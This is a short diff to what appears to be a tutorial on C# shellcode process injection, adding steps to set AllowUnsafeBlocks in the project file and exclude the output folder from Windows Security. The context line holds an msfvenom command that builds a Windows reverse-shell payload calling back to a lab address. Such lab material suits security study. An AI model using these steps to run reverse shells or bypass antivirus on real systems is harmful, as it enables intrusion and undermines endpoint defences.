@@ -20,7 +20,15 @@ msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 
 
 ![Enable unsafe code](images/50_50_EnableUnsafeCodeForProject.png)
 
-5. Now compile and run. 
+5. The end result of that step will be, the project file will be modified as follows.
+
+```xml
+<AllowUnsafeBlocks>True</AllowUnsafeBlocks>
+```
+
+6. Windows Security will not allow this program to run. So you need to explude the output folder. See the previous example, SimpleShellCode for steps.
+
+7. Now compile and run.
 
 # References
 1. https://github.com/tasox/CSharp_Process_Injection
